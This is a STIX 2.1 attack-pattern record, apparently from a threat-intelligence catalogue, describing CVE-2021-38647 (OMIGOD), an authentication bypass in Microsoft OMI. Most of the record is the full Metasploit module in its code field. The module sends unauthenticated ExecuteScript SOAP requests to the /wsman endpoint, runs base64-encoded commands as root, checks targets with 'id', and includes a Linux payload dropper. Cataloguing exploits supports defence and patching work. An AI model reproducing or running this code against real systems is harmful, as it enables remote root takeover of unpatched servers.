{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e4439e31-1593-4a44-b788-38897efee9b5",
    "created": "2024-08-14T16:57:46.707117Z",
    "modified": "2024-08-14T16:57:46.707121Z",
    "name": "Microsoft OMI Management Interface Authentication Bypass",
    "description": " By removing the authentication header, an attacker can issue an HTTP request to the OMI management endpoint that will cause it to execute an operating system command as the root user. This vulnerability was patched in OMI version 1.6.8-1 (released September 8th 2021). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/cve_2021_38647_omigod.rb",
            "external_id": "cve_2021_38647_omigod.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-38647"
        },
        {
            "source_name": "reference",
            "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647"
        },
        {
            "source_name": "reference",
            "url": "https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure"
        },
        {
            "source_name": "reference",
            "url": "https://censys.io/blog/understanding-the-impact-of-omigod-cve-2021-38647/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/08O94gYdF1/cve-2021-38647"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  XML_NS = { 'p' => 'http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem' }.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft OMI Management Interface Authentication Bypass',\n        'Description' => %q{\n          By removing the authentication header, an attacker can issue an HTTP request to the OMI management endpoint\n          that will cause it to execute an operating system command as the root user. This vulnerability was patched in\n          OMI version 1.6.8-1 (released September 8th 2021).\n        },\n        'Author' => [\n          'Nir Ohfeld', # vulnerability discovery & research\n          'Shir Tamari', # vulnerability discovery & research\n          'Spencer McIntyre', # metasploit module\n          'wvu' # vulnerability research\n        ],\n        'References' => [\n          ['CVE', '2021-38647'],\n          ['URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647'],\n          ['URL', 'https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure'],\n          ['URL', 'https://censys.io/blog/understanding-the-impact-of-omigod-cve-2021-38647/'],\n          ['URL', 'https://attackerkb.com/topics/08O94gYdF1/cve-2021-38647']\n        ],\n        'DisclosureDate' => '2021-09-14',\n        'License' => MSF_LICENSE,\n        'Platform' => ['linux', 'unix'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'RPORT' => 5985,\n          'SSL' => false,\n          'MeterpreterTryToFork' => true\n        },\n        'Notes' => {\n          'AKA' => ['OMIGOD'],\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/wsman'])\n    ])\n  end\n\n  def check\n    http_res = send_command('id')\n    return CheckCode::Unknown if http_res.nil?\n    return CheckCode::Safe unless http_res.code == 200\n\n    cmd_res = parse_response(http_res)\n    return CheckCode::Unknown if cmd_res.nil? || cmd_res[:stdout] !~ /uid=(\\d+)\\(\\S+\\) /\n\n    return CheckCode::Vulnerable(\"Command executed as uid #{Regexp.last_match(1)}.\")\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      result = execute_command(payload.encoded)\n      if result\n        print_status(result[:stdout]) unless result[:stdout].blank?\n        print_error(result[:stderr]) unless result[:stderr].blank?\n      end\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n    res = send_command(cmd)\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Failed to execute command: #{cmd}\")\n    end\n\n    parse_response(res)\n  end\n\n  def parse_response(res)\n    return nil unless res&.code == 200\n\n    return_code = res.get_xml_document.at_xpath('//p:SCX_OperatingSystem_OUTPUT/p:ReturnCode', XML_NS)&.content.to_i\n    unless return_code == 0\n      print_error(\"Failed to execute command: #{cmd} (status: #{return_code})\")\n    end\n\n    {\n      return_code: return_code,\n      stdout: res.get_xml_document.at_xpath('//p:SCX_OperatingSystem_OUTPUT/p:StdOut', XML_NS)&.content,\n      stderr: res.get_xml_document.at_xpath('//p:SCX_OperatingSystem_OUTPUT/p:StdErr', XML_NS)&.content\n    }\n  end\n\n  def send_command(cmd)\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path),\n      'ctype' => 'text/xml;charset=UTF-8',\n      'data' => Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)\n        <s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" xmlns:n=\"http://schemas.xmlsoap.org/ws/2004/09/enumeration\" xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema\" xmlns:h=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\" xmlns:p=\"http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd\">\n          <s:Header>\n            <a:To>HTTP://127.0.0.1:5985/wsman/</a:To>\n            <w:ResourceURI s:mustUnderstand=\"true\">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>\n            <a:ReplyTo>\n              <a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n            </a:ReplyTo>\n            <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>\n            <w:MaxEnvelopeSize s:mustUnderstand=\"true\">102400</w:MaxEnvelopeSize>\n            <a:MessageID>uuid:#{Faker::Internet.uuid}</a:MessageID>\n            <w:OperationTimeout>PT1M30S</w:OperationTimeout>\n            <w:Locale xml:lang=\"en-us\" s:mustUnderstand=\"false\"/>\n            <p:DataLocale xml:lang=\"en-us\" s:mustUnderstand=\"false\"/>\n            <w:OptionSet s:mustUnderstand=\"true\"/>\n            <w:SelectorSet>\n              <w:Selector Name=\"__cimnamespace\">root/scx</w:Selector>\n            </w:SelectorSet>\n          </s:Header>\n          <s:Body>\n            <p:ExecuteScript_INPUT xmlns:p=\"http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\">\n              <p:Script>#{Rex::Text.encode_base64(cmd)}</p:Script>\n              <p:Arguments/>\n              <p:timeout>0</p:timeout>\n              <p:b64encoded>true</p:b64encoded>\n            </p:ExecuteScript_INPUT>\n          </s:Body>\n        </s:Envelope>\n      ENVELOPE\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-09-14",
    "x_mitre_platforms": [
        "linux'"
    ]
}